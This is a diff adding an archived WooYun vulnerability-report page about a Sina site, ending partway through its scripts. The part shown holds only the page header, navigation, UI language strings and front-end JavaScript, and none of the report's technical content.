@@ -1,0 +1,1149 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta http-equiv="x-ua-compatible" content="ie=7"/>
+<title> Sina某站从任意文件读取到GetShell | WooYun-2015-91301 | WooYun.org </title>
+<meta name="author" content="80sec"/>
+<meta name="copyright" content="http://www.wooyun.org/"/>
+<meta name="keywords" content="新浪漏洞,boooooom,文件上传导致任意代码执行,wooyun,应用安全,web安全,系统安全,网络安全,漏洞公布,漏洞报告,安全资讯。"/>
+<meta name="description" content="RT|WooYun是一个位于厂商和安全研究者之间的漏洞报告平台,注重尊重,进步,与意义"/>
+<link rel="icon" href="http://wooyun.org/favicon.ico" sizes="32x32" />
+<link href="../css/style.css?v=201501291909" rel="stylesheet" type="text/css"/>
+<script src="https://static.wooyun.org/static/js/jquery-1.4.2.min.js" type="text/javascript"></script>
+</head>
+
+<body id="bugDetail">
+
+<style>
+#myBugListTab { position:relative; display:inline; border:none }
+#myBugList { position:absolute; display:none; margin-left:309px; * margin-left:-60px; * margin-top:18px ; border:#c0c0c0 1px solid; padding:2px 7px; background:#FFF }
+#myBugList li { text-align:left }
+</style>
+<script type="text/javascript">
+$(document).ready(function(){
+
+	if ( $("#__cz_push_d_object_box__") ) {
+		$("script[src^='http://cip4.czpush.com/']").attr("src"," ").remove();
+		$("#__cz_push_d_object_box__").empty().remove();
+		$("a[id^='__czUnion_a']").attr("href","#").remove();
+	}
+
+	if ( $("#ooDiv") ) {
+		$("#ooDiv").empty().parent("div").remove();
+	}
+
+	$("#myBugListTab").toggle(
+		function(){
+			$("#myBugList").css("display","block");
+		},
+		function(){
+			$("#myBugList").css("display","none");
+		}
+	);
+
+	if ( $(window).scrollTop() > 120 ) {
+		$("#back-to-top").fadeIn(300);
+	} else {
+		$("#back-to-top").fadeOut(300);
+	} 
+
+	$(window).scroll(function(){
+		if ( $(window).scrollTop() > 120 ) {
+			$("#back-to-top").fadeIn(300);
+		} else {
+			$("#back-to-top").fadeOut(300);
+		} 
+	});
+
+	$("#back-to-top a").click(function() {
+		$('body,html').animate({scrollTop:0},300);
+		return false;
+	});
+
+	$("#go-to-comment a").click(function() {
+		var t = $("#replys").offset().top - 52;
+		$('body,html').animate({scrollTop:t},300);
+		return false;
+	});
+
+});
+
+function gofeedback(){
+	var bugid=$("#fbid").val();
+	if(bugid){
+		var url="/feedback.php?bugid="+bugid;
+	}else{
+		var url="/feedback.php"
+	}
+	window.open(url);
+}
+</script>
+
+	<div class="go-to-wrapper">
+		<ul class="go-to">
+		    <li id="go-to-comment" title="转到评论"><a href="wooyun-2015-091301#">转到评论</a></li>
+		    <li id="go-to-feedback" title="我要反馈"><a href="javascript:void(0)" onclick="gofeedback()">我要反馈</a></li>
+		    <li id="back-to-top" title="回到顶部"><a href="wooyun-2015-091301#">回到顶部</a></li>
+		</ul>
+	</div>
+	<div class="banner">
+		<div class="logo">
+		<h1>WooYun.org</h1>
+		<div class="weibo"><iframe width="136" height="24" frameborder="0" allowtransparency="true" marginwidth="0" marginheight="0" scrolling="no" border="0" src="http://widget.weibo.com/relationship/followbutton.php?language=zh_cn&width=136&height=24&uid=1981622273&style=2&btn=red&dpc=1"></iframe>
+		</div>
+		<div class="wxewm">
+			<a class="ewmthumb" href="javascript:void(0)"><span><img src="https://static.wooyun.org/static/images/ewm.jpg"width="220" border="0"></span><img src="https://static.wooyun.org/static/images/weixin_30.png"width="22" border="0"></a>
+		</div>
+		</div>
+		
+				<div class="login">
+					<a href="http://wooyun.org/user.php?action=login">登录</a> | <a href="http://wooyun.org/user.php?action=register" class="reg">注册</a>
+				</div>
+				</div>
+
+	<div class="nav" id="nav_sc">
+		<ul>
+			<li><a href="http://wooyun.org/index.php">首页</a></li>
+			<li><a href="http://wooyun.org/corps/">厂商列表</a></li>
+			<li><a href="http://wooyun.org/whitehats/">白帽子</a></li>
+			<li><a href="http://wooyun.org/top/">乌云榜</a></li> 
+            <li><a href="http://wooyun.org/teams/">团队</a></li>
+            <li><a href="http://wooyun.org/bugs/">漏洞列表</a></li>
+			<li class="new"><a href="http://wooyun.org/bug/submit">提交漏洞</a></li>
+			<!--li><a href="/corp_actions">厂商活动</a></li-->
+			<!--<li><a target='_blank' href="http://security.wooyun.org/">安全中心</a></li>-->
+			<li><a href="http://summit.wooyun.org" target="_blank" style="color:rgb(246,172,110);font-size:14px;font-weight:blod">乌云峰会</a></li>
+			<!--li><a href="/job/">企业招聘</a></li-->
+						<li><a href="http://job.wooyun.org" target="_blank">乌云招聘</a></li>
+						<li><a href="http://drops.wooyun.org" target="_blank">知识库</a></li>
+						<li><a href="http://wooyun.org/notice/">公告</a></li>
+		</ul>
+        <form action="http://wooyun.org/searchbug.php" method="post" id="searchbox">
+            <input type="text" name="q" id="search_input" />
+            <input type="submit" value="搜索" id="search_button" />
+        </form>
+	</div>
+
+	<div class="bread" style="padding-top: 4px;">
+		<div style="float:left">当前位置：<a href="http://wooyun.org/index.php">WooYun</a> >> <a href="wooyun-2015-091301#">漏洞信息</a></div>
+			</div><script language="javascript">
+var _LANGJS = {"COMMENT_LIKE_SELF":"\u4e0d\u80fd\u81ea\u5df1\u8d5e\u81ea\u5df1\u7684\u8bc4\u8bba","COMMENT_LIKED":"\u5df2\u8d5e\u6b64\u8bc4\u8bba","COMMENT_NOT":"\u6b64\u8bc4\u8bba\u4e0d\u5b58\u5728","COMMENT_FILL":"\u8bf7\u8f93\u5165\u8bc4\u8bba\u5185\u5bb9","COMMENT_STAT":"\u8bc4\u8bba\u4e0d\u80fd\u4e3a\u7a7a","COMMENT_LOGIN":"\u767b\u9646\u540e\u624d\u80fd\u8bc4\u8bba","COMMENT_GOOD_DONE":"\u5df2\u8d5e\u8fc7\u6b64\u6761\u8bc4\u8bba","COMMENT_SELF":"\u4e0d\u80fd\u8bc4\u4ef7\u81ea\u5df1\u53d1\u5e03\u7684\u8bc4\u8bba","COMMENT_CLICK_FILL":"\u70b9\u51fb\u8f93\u5165\u8bc4\u8bba\u5185\u5bb9","FAIL":"\u64cd\u4f5c\u5931\u8d25","FAIL_MANAGE":"\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u4e0e\u7ba1\u7406\u5458\u8054\u7cfb","FAIL_NO_WHITEHATS":"\u64cd\u4f5c\u5931\u8d25\uff0c\u6ca1\u6709\u6b64\u767d\u5e3d\u5b50","FAIL_NO_CORPS":"\u64cd\u4f5c\u5931\u8d25\uff0c\u6ca1\u6709\u6b64\u5382\u5546","BUGS_CORPS_SELECT":"\u9009\u62e9\u5382\u5546(\u53ef\u8f93\u5165\u5173\u952e\u5b57\u641c\u7d22)","BUGS_CORPS_OTHER":"Other\/\u5176\u5b83\u5382\u5546","BUGS_CORPS_TYPE_STAT":"\u8be5\u6f0f\u6d1e\u5bf9\u5e94\u5382\u5546\u7684\u7c7b\u578b","BUGS_CORPS_NAME_STAT":"\u8be5\u6f0f\u6d1e\u5bf9\u5e94\u5382\u5546\u7684\u540d\u79f0","BUGS_TYPE_STAT":"\u8be5\u6f0f\u6d1e\u7684\u7c7b\u578b\uff0c\u4e71\u9009\u6263\u5206","BUGS_TITLE_STAT":"\u8be5\u6f0f\u6d1e\u7684\u6807\u9898","BUGS_HARMLEVEL_STAT":"\u8be5\u6f0f\u6d1e\u7684\u5371\u5bb3\u7b49\u7ea7","BUGS_DESCRIPTION_STAT":"\u5bf9\u6f0f\u6d1e\u7684\u7b80\u8981\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7b80\u5355\u63cf\u8ff0\u6f0f\u6d1e\u7684\u5371\u5bb3\u548c\u6210\u56e0\uff0c\u4e0d\u8981\u900f\u6f0f\u6f0f\u6d1e\u7684\u7ec6\u8282","BUGS_CONTENT_STAT":"\u5bf9\u6f0f\u6d1e\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u8bf7\u5c3d\u91cf\u591a\u7684\u6df1\u5165\u7ec6\u8282\u4ee5\u65b9\u4fbf\u5bf9\u6f0f\u6d1e\u7684\u7406\u89e3\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_POC_STAT":"\u7ed9\u51fa\u95ee\u9898\u7684\u6982\u5ff5\u6027\u8bc1\u660e\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_PATCH_STAT":"\u5efa\u8bae\u7684\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848\uff0c\u652f\u6301&lt;code>&lt;\/code>\u6807\u7b7e","BUGS_TEST_STAT":"\u7ed9\u51fa\u95ee\u9898\u7684\u6807\u51c6\u6d4b\u8bd5\u4ee3\u7801\u4ee5\u66f4\u4e3a\u65b9\u4fbf\u7684\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u6d4b\u8bd5\u548c\u9a8c\u8bc1\uff0c\u6d4b\u8bd5\u4ee3\u7801\u5bf9\u5916\u9ed8\u8ba4\u4e0d\u663e\u793a\uff0c<br\/>\u5176\u4ed6\u767d\u5e3d\u5b50\u652f\u4ed8\u4e4c\u4e91\u5e01\u67e5\u770b\u540e\u4f60\u5c06\u83b7\u5f97\u989d\u5916\u4e4c\u4e91\u5e01\uff0c<br\/>\u540c\u65f6\u4e5f\u5c06\u5728\u4f60\u7684\u4e2a\u4eba\u9875\u9762\u4f53\u73b0\u4f60\u7684\u6d4b\u8bd5\u4ee3\u7801\u7f16\u5199\u80fd\u529b\u3002","BUGS_QUESTION_SELECT":"\u8bf7\u9009\u62e9\u95ee\u9898\u5382\u5546","BUGS_TITLE_NOTICE":"\u6f0f\u6d1e\u6807\u9898\u4e0d\u80fd\u4e3a\u7a7a","BUGS_RANK_NOTICE1":"\u8bf7\u586b\u5199\u81ea\u8bc4Rank","BUGS_RANK_NOTICE2":"\u81ea\u8bc4Rank\u4e3a\u5927\u4e8e0\u7684\u6570\u5b57","BUGS_TYPE_SELECT":"\u8bf7\u9009\u62e9\u6f0f\u6d1e\u7c7b\u578b","BUGS_TYPE_NOTICE":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u7c7b\u578b","BUGS_HARMLEVEL_SELECT":"\u9009\u62e9\u6f0f\u6d1e\u7b49\u7ea7","BUGS_HARMLEVEL_NOTICE":"\u8bf7\u9009\u62e9\u6f0f\u6d1e\u7b49\u7ea7","BUGS_HARMLEVEL_LOWER":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u4f4e \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a1-5","BUGS_HARMLEVEL_MIDDLE":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u4e2d \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a5-10","BUGS_HARMLEVEL_HIGH":"\u6f0f\u6d1e\u7b49\u7ea7\u4e3a \u9ad8 \u65f6\uff0c\u81ea\u8bc4Rank\u4e3a10-20","BUGS_AREA_SELECT":"\u8bf7\u9009\u62e9\u5730\u533a\uff01","BUGS_DOMAILS":"\u6f0f\u6d1e\u6240\u5728\u57df\u540d(\u5982qq.com)","BUGS_DOMAIN_FILL":"\u8bf7\u586b\u5199\u57df\u540d\uff01","BUGS_DETAIL_MORE":"\u67e5\u770b\u8be6\u60c5","BUGS_IGNORE_DAYS":"\u8ddd\u6f0f\u6d1e\u5ffd\u7565\u8fd8\u6709","BUGS_CONFIRM_QUICK":"\u8bf7\u5382\u5546\u5c3d\u5feb","BUGS":"\u6f0f\u6d1e","BUGS_PUBLIC_DAYS":"\u8ddd\u6f0f\u6d1e\u5411\u516c\u4f17\u516c\u5f00\u8fd8\u6709","BUGS_IGNORE_PUBLIC_DAYS":"\u8ddd\u6f0f\u6d1e\u672a\u786e\u8ba4\u65e0\u5f71\u54cd\u5ffd\u7565\u8fd8\u6709","BUGS_REPAIR_QUICK":"\u8bf7\u5382\u5546\u5c3d\u5feb\u4fee\u590d\u6f0f\u6d1e","BUGS_HARMLEVEL_REMIND":"\u8bf7\u9009\u62e9\u5371\u5bb3\u7b49\u7ea7","BUGS_RANK_STAT":"rank\u4e3a1-20\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT1":"rank\u4e3a1-5\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT2":"rank\u4e3a5-10\u7684\u6b63\u6574\u6570","BUGS_RANK_STAT3":"rank\u4e3a10-20\u7684\u6b63\u6574\u6570","BUGS_COMPLEMENT_REASON":"\u6dfb\u52a0\u5bf9\u6f0f\u6d1e\u7684\u8865\u5145\u8bf4\u660e\u4ee5\u53ca\u505a\u51fa\u8bc4\u4ef7\u7684\u7406\u7531","BUGS_REPLY_FILL":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u56de\u590d","BUGS_IGNORE_CONFIRM":"\u786e\u5b9a\u5ffd\u7565\u6b64\u6f0f\u6d1e\u5417","BUGS_STATUS_NEW_UPDATE":"\u66f4\u6539\u6f0f\u6d1e\u7684\u6700\u65b0\u72b6\u6001","BUGS_STATUS_FILL":"\u8bf7\u586b\u5199\u6f0f\u6d1e\u72b6\u6001","BUGS_PUBLIC_ADVANCE":"\u786e\u5b9a\u63d0\u524d\u516c\u5f00\u6b64\u6f0f\u6d1e\u5417","BUGS_COUNT":"\u6f0f\u6d1e\u6570","BUGS_REPLY_HAT":"\u56de\u590d\u6b64\u4eba","BUGS_DELAY_CONFIRM":"\u786e\u5b9a\u8981\u5ef6\u671f\u4e48?","BUGS_DELAY":"\u7533\u8bf7\u5ef6\u671f","BUGS_DELAY_DONE":"\u5df2\u7ecf\u5ef6\u671f","BUGS_RISK_CONFIM":"\u786e\u5b9a\u6b64\u6f0f\u6d1e\u4e3a\u9ad8\u5371\u5417?","BUGS_NULL_EDITE":"\u7559\u7a7a\u8868\u793a\u4e0d\u4fee\u6539","BUGS_DONE_CONFIRM":"\u8be5\u64cd\u4f5c\u6682\u65f6\u4e0d\u53ef\u9006\uff0c\u786e\u5b9a\uff1f","BUGS_UPUBLIC":"\u4f60\u4ece\u53d1\u5e03\u7684\u6f0f\u6d1e","BUGS_UPUBLIC1":"\u91cc\u53c8\u83b7\u5f97\u4e86","BUGS_PRECHECK":"\u6709\u4eba\u63d0\u524d\u67e5\u770b\u4e86\u4f60\u53d1\u5e03\u7684\u6f0f\u6d1e","BUGS_PRECHECK_UNPUBLIC":"\u63d0\u524d\u67e5\u770b\u672a\u516c\u5f00\u6f0f\u6d1e","BUGS_NUM":"\u6f0f\u6d1e\u6570\u91cf","RANKAVG":"\u4eba\u5747\u8d21\u732e Rank","CAPTCHA_GET":"\u83b7\u53d6\u9a8c\u8bc1\u7801","CAPTCHA_FILL":"\u8bf7\u8f93\u5165\u56fe\u7247\u4e2d\u7684\u9a8c\u8bc1\u7801","CAPTCHA_NULL":"\u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a","CAPTCHA_ERROR":"\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef","CAPTCHA_PHONE_ERROR":"\u624b\u673a\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e","CAPTCHA_PHONE_SEND":"\u9a8c\u8bc1\u7801\u5df2\u53d1\u9001\u5230\u4f60\u7684\u624b\u673a\u4e0a\u8bf7\u6ce8\u610f\u67e5\u6536","CAPTCHA_SEND_AGAIN":"\u540e\u53ef\u91cd\u53d1","CAPTCHA_SEND_OVER":"\u77ed\u4fe1\u5df2\u53d1\u9001\u6210\u529f,\u9a8c\u8bc1\u7801\u533a\u5206\u5927\u5c0f\u5199","CAPTCHA_PHONE_NO":"\u4e0d\u9700\u8981\u77ed\u4fe1\u9a8c\u8bc1\u7801","CAPTCHA_PHONE_NULL":"\u77ed\u4fe1\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a","PHONE_TYPE_ERROR":"\u7535\u8bdd\u683c\u5f0f\u4e0d\u5bf9","PHONE_NOTING":"\u7535\u8bdd\u4e0d\u80fd\u4e3a\u7a7a","PHONE_FILL":"\u8bf7\u586b\u5199\u624b\u673a\u53f7","PHONE_CAPTCHA_NOTING":"\u624b\u673a\u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_NOTING":"\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_CONFIRM_NOTING":"\u5bc6\u7801\u786e\u8ba4\u4e0d\u80fd\u4e3a\u7a7a","PASSWORD_PAY_LESS":"\u652f\u4ed8\u5bc6\u7801\u4e0d\u80fd\u5c11\u4e8e6\u4f4d","PASSWORD_FILL_DIFFERENT":"\u8f93\u5165\u7684\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u6837","PASSWORD_PAY_LOGIN_SAME":"\u652f\u4ed8\u5bc6\u7801\u4e0d\u80fd\u540c\u767b\u9646\u5bc6\u7801\u4e00\u6837","PASSWORD_PAY_FILL":"\u8bf7\u586b\u5199\u652f\u4ed8\u5bc6\u7801","PASSWORD_LENGH_LESS":"\u5bc6\u7801\u957f\u5ea6\u4e0d\u80fd\u5c0f\u4e8e6\u4f4d","PASSWORD_SEND_OK":"\u53d1\u9001\u5bc6\u7801\u90ae\u4ef6\u6210\u529f","PASSWORD_OFER_WRROR":"\u60a8\u63d0\u4f9b\u7684\u627e\u56de\u5bc6\u7801\u4fe1\u606f\u4e0d\u6b63\u786e","PASSWORD_OLD_ERROR":"\u539f\u5bc6\u7801\u9519\u8bef","PASSWORD_UPDATE_OK":"\u5bc6\u7801\u4fee\u6539\u6210\u529f","EMAILL_USED":"\u90ae\u7bb1\u5df2\u88ab\u5360\u7528","EMAILL_NULL":"\u90ae\u7bb1\u4e0d\u80fd\u4e3a\u7a7a\uff01","NOTING":"\u65e0","LEAVEWORDS_NULL":"\u7559\u8a00\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a","LOGIN_FIRST":"\u8bf7\u5148\u767b\u5f55","CONFIRM":"\u786e\u8ba4","YEAR":"\u5e74","DAYS":"\u5929","HOURS":"\u65f6","HOUR":"\u5c0f\u65f6","MINUTE":"\u5206","SECOND":"\u79d2","IS":"\u4e3a","ONE":"\u4e00","TWE":"\u4e8c","TIMES":"\u6b21","COUNTENT_UPDATE_FILL":"\u8bf7\u586b\u5199\u4fee\u6539\u5185\u5bb9","CANCLE":"\u53d6\u6d88","OPERATE_CONFIRM":"\u786e\u5b9a\u6b64\u64cd\u4f5c\u5417\uff1f","USERNAME":"\u59d3\u540d","SUCCESS":"\u64cd\u4f5c\u6210\u529f","FAIL_REPLY":"\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u586b\u5199\u56de\u590d\u4fe1\u606f","SEND_OK":"\u53d1\u9001\u6210\u529f","PHONE_BIND_DONE":"\u5df2\u7ed1\u5b9a","TAGS_USE":"\u4f7f\u7528\u6b64\u6807\u7b7e","WHITEHATS":"\u767d\u5e3d\u5b50","WHITEHATS_VERTIFY":"\u8ba4\u8bc1\u767d\u5e3d\u5b50","WHITEHATES_NAME":"\u8bf7\u8f93\u5165\u767d\u5e3d\u5b50\u7528\u6237\u540d","USER_ZONE_EDIT":"\u7f16\u8f91\u9886\u57df","WB_TRANSFER":"\u6211\u8981\u8f6c\u8d26","WB_TRANSFER_CANCEL":"\u53d6\u6d88\u8f6c\u8d26","WB_NUM":"\u8bf7\u8f93\u5165\u4e4c\u4e91\u5e01\u6570\u91cf","WB_NUMBER":"\u4e4c\u4e91\u5e01\u6570\u91cf\u4e3a\u6b63\u6574\u6570","WB_NEED_LESS":"\u81f3\u5c11\u9700\u8981","WB_NEED_SUM":"\u4e2a\u4e4c\u4e91\u5e01","WB_TRANSFER_OK":"\u8f6c\u8d26\u6210\u529f","WB_MY":"\u6211\u7684\u4e4c\u4e91\u5e01","WB_CAN_USE":"\u53ef\u7528\u7684\u4e4c\u4e91\u5e01","WB_FROZEN":"\u51bb\u7ed3\u7684\u4e4c\u4e91\u5e01","WB_LACK":"\u4e4c\u4e91\u5e01\u4e0d\u8db3","WB_SET_SCOPE":"\u51fa\u4ef7\u8303\u56f4\u4e3a","WB_BIND_CANCEL_STAT":"(\u70b9\u51fb\u201c\u53d6\u6d88\u7ed1\u5b9a\u201d\u83b7\u53d6\u9a8c\u8bc1\u7801\uff0c\u5411\u4e4c\u4e91\u516c\u4f17\u8d26\u53f7\u53d1\u9001\u9a8c\u8bc1\u7801\u53d6\u6d88\u5fae\u4fe1\u7ed1\u5b9a\uff0c\u7136\u540e\u5237\u65b0\u672c\u9875\u9762)","EMAIL_LOGIN_MEXT":"\u90ae\u4ef6\u53d1\u9001\u6210\u529f,\u8bf7\u767b\u9646\u60a8\u7684\u90ae\u7bb1\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c","EMAIL_UPDATE_LOGIN_MEXT":"\u66f4\u6539\u8bf7\u6c42\u5df2\u53d1\u9001\u5230\u90ae\u7bb1,\u8bf7\u767b\u9646\u60a8\u7684\u90ae\u7bb1\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c","EMAIL_SEND_OK":"\u90ae\u4ef6\u53d1\u9001\u6210\u529f\uff01","CORPS":"\u5382\u5546","TEAM_NAME_NULL":"\u56e2\u961f\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a","TEAM_HOMEPAGE_NULL":"\u56e2\u961f\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","TEAM_QQ_NULL":"\u56e2\u961fqq\u4e0d\u80fd\u4e3a\u7a7a","TEAM_BRIEF_NULL":"\u56e2\u961f\u7b80\u4ecb\u4e0d\u80fd\u4e3a\u7a7a","TEAM_EXIST":"\u56e2\u961f\u5df2\u5b58\u5728","TEAM_DISMISS_CONFIRM":"\u786e\u5b9a\u89e3\u6563\u672c\u56e2\u961f\u5417?","TEAM_NAME":"\u56e2\u961f\u540d\u79f0","TEAM_CREATER":"\u521b\u5efa\u4eba","TEAM_DONATER":"\u56e2\u961f\u4e3b\u529b","TEAM_MUMBER":"\u4eba\u6570","TEAM":"\u56e2\u961f","REGISTER_BRIEF":"*\u8bf7\u8f93\u5165\u4e2a\u4eba\u7684\u7b80\u8981\u4ecb\u7ecd","REGISTER_TYPE":"*\u9009\u62e9\u6ce8\u518c\u7c7b\u578b","REGISTER_CORPS_BRIEF":"*\u8f93\u5165\u5382\u5546\u7684\u7b80\u8981\u4ecb\u7ecd","REGISTER_EMAIL":"*\u5382\u5546\u90ae\u4ef6\u5fc5\u987b\u4e3a\u4f01\u4e1a\u4f7f\u7528\u7684\u6b63\u5f0f\u90ae\u4ef6","REGISTER_NAME_NULL":"\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_HOMEPAGE_NULL":"\u4e2a\u4eba\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_BREIF_NULL":"\u7b80\u8981\u4ecb\u7ecd\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_CORPNAME_NULL":"\u5382\u5546\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_CORPHOMEPAGE_NULL":"\u5b98\u65b9\u4e3b\u9875\u4e0d\u80fd\u4e3a\u7a7a","REGISTER_LAW_AGREE":"\u540c\u610f\u300a\u4fe1\u606f\u5b89\u5168\u76f8\u5173\u4fdd\u62a4\u548c\u58f0\u660e\u300b\u624d\u80fd\u6ce8\u518c","ATTENTION":"\u5173\u6ce8","ATTENTION_SUM":"\u5173\u6ce8\u6570","ATTENTION_DONE":"\u5df2\u5173\u6ce8","ATTENTION_CANCEL":"\u53d6\u6d88\u5173\u6ce8","ATTENTION_BUG_DONE":"\u5df2\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_BUG_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u6f0f\u6d1e\u7684\u5173\u6ce8","ATTENTION_BUG":"\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_BUG_UNDO":"\u6ca1\u6709\u5173\u6ce8\u6b64\u6f0f\u6d1e","ATTENTION_HAT_DONE":"\u5df2\u5173\u6ce8\u6b64\u767d\u5e3d\u5b50","ATTENTION_HAT_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u767d\u5e3d\u5b50\u7684\u5173\u6ce8?","COLLECTION":"\u6536\u85cf","COLLECTION_DONE":"\u5df2\u6536\u85cf","COLLECTION_BUG_DONE":"\u5df2\u6536\u85cf\u6b64\u6f0f\u6d1e","COLLECTION_BUG_UNDO":"\u6ca1\u6709\u6536\u85cf\u6b64\u6f0f\u6d1e","COLLECTION_BUG_CONFIRM":"\u786e\u5b9a\u53d6\u6d88\u5bf9\u6b64\u6f0f\u6d1e\u7684\u6536\u85cf","SMS_SEND_NAME":"* \u7528\u6237\u6635\u79f0\/\u5382\u5546\u540d\u79f0\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_TITLE":"* \u6807\u9898\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_CONTENT":"* \u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a<br \/>","SMS_SEND_CAPTCHA":"* \u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a<br \/>","NUMBER":"\u7684\u6b63\u6574\u6570","RATING_SUCCESS":"\u8bc4\u5206\u6210\u529f","RATING_BUGS_DONE":"\u5df2\u5bf9\u6b64\u6f0f\u6d1e\u8fdb\u884c\u8fc7\u8bc4\u5206","RATING_BUGS_SELF":"\u4e0d\u80fd\u5bf9\u81ea\u5df1\u53d1\u5e03\u7684\u6f0f\u6d1e\u8fdb\u884c\u8bc4\u5206","RATING_SUBMIT_CANCLE":"\u53d6\u6d88\u63d0\u4ea4\u8bc4\u5206","RATING_SUBMIT":"\u63d0\u4ea4\u6211\u7684\u8bc4\u5206","RATING_SUBMIT_CHECK":"\u8bf7\u786e\u5b9a\u6bcf\u4e00\u9879\u90fd\u9009\u62e9\u4e86\u8bc4\u5206","RATING_CONFIRM":"\u786e\u5b9a\u63d0\u4ea4\u5bf9\u6b64\u5382\u5546\u7684\u8bc4\u5206\u5417\uff1f","RATING_LOGIN":"\u53ea\u6709\u767b\u5f55\u7684\u767d\u5e3d\u5b50\u624d\u80fd\u8bc4\u5206","RATING_DONE":"\u5df2\u7ecf\u8bc4\u8fc7\u5206\u4e86","WOOYUN_CORPS":"\u4e4c\u4e91\u5382\u5546","MARST_IMAGE":"\u5bf9\u56fe\u7247\u6253\u7801","FEEDBACK_LINK_NULL":"\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01","FEEDBACK_LINK_ERROR":"\u8bf7\u4e66\u5199\u6b63\u786e\u7684\u94fe\u63a5\u5730\u5740\uff01","FEEDBACK_CONTENT_NULL":"\u95ee\u9898\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01","FEEDBACK_ALLOW_LIMIT":"\u534a\u5c0f\u65f6\u53ea\u5141\u8bb8\u53cd\u9988\u4e00\u6b21","TOP_RANK":"\u6392\u540d","TOP_BUG_TITLE":"\u6f0f\u6d1e\u6807\u9898","TOP_RANK_NONE":"\u6682\u65e0\u6392\u540d","TOP_BUGS_GOOD":"\u4f18\u8d28\u6f0f\u6d1e\u6570","NICKNAME":"\u6635\u79f0","LEVEL":"\u7b49\u7ea7","VALUE":"\u503c","EDITOR_INSERT_PIC":"\u63d2\u5165\u56fe\u7247","EDITOR_PIC_ADDR":"\u5730\u5740\uff1a","EDITOR_CONFIRM":"\u786e\u5b9a","EDITOR_PIC_NULL":"\u8bf7\u4e0a\u4f20\u56fe\u7247\u6216\u586b\u5199\u56fe\u7247\u5730\u5740","EDITOR_INSERT_VIDIO":"\u63d2\u5165\u89c6\u9891","EDITOR_VIDIO_ADDR":"\u89c6\u9891\u5730\u5740\uff1a","EDITOR_VIDIO_NULL":"\u8bf7\u586b\u5199\u89c6\u9891\u5730\u5740(.swf)","EDITOR_VIDIO_TYPE":"\u76ee\u524d\u4ec5\u652f\u6301.swf\u683c\u5f0f","PIC_SELECT":"\u8bf7\u9009\u62e9\u5f85\u4e0a\u4f20\u7684\u56fe\u7247","PIC_TYPE_IS":"\u56fe\u7247\u7c7b\u578b\u4e3a","UPLOAD":"\u4e0a\u4f20","RANK_AVG":"\u6f0f\u6d1e\u5e73\u5747"};
+
+$(function(){
+    function getParamsOfShareWindow(width, height) {
+        return ['toolbar=0,status=0,resizable=1,width=' + width + ',height=' + height + ',left=',(screen.width-width)/2,',top=',(screen.height-height)/2].join('');
+    }
+});
+
+function errimg(img){
+	tmp=img.src;
+	nimg=tmp.replace("http://wooyun.org/","http://www.wooyun.org/");
+	img.src=nimg;
+	$(img).parent().attr('href',nimg);
+	img.onerror=null;
+}
+function AttendBug(id){
+	$.get('/ajaxdo.php',{module:'attendbug',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+		if(re==1){
+			$("#attention_num").html(parseInt($("#attention_num").html())+1);
+			$("#attend_action").html('√'+_LANGJS.ATTENTION_DONE+' <a class="btn" href="javascript:void(0)" onclick="AttendCancel('+id+')">'+_LANGJS.ATTENTION_CANCEL+'</a></span>');
+		}else if(re==2){
+			alert(_LANGJS.LOGIN_FIRST);
+		}else if(re==3){
+			alert(_LANGJS.ATTENTION_BUG_DONE);
+		}else{
+			alert(_LANGJS.FAIL_MANAGE);
+		}
+	});
+}
+function AttendCancel(id){
+	if(confirm(_LANGJS.ATTENTION_BUG_CONFIRM+"?")){
+		$.get('/ajaxdo.php',{module:'attendcancel',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+			if(re==1){
+				$("#attention_num").html(parseInt($("#attention_num").html())-1);
